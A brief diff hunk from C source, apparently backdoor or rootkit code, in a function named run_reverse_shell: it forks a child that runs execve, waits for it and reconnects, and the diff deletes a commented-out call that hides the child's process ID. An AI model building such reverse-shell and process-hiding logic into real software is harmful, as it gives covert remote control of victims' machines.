@@ -50,7 +50,6 @@ void run_reverse_shell()
 				_exit(1); /* In case execve fails */
 			} else if (child > 0) {
 				/* Wait for child to exit then reconnect */
-				// hider_hide_pid(child);
 				printf("pid2: %d\n", child);
 				waitpid(child, NULL, 0);
 				close(sock);
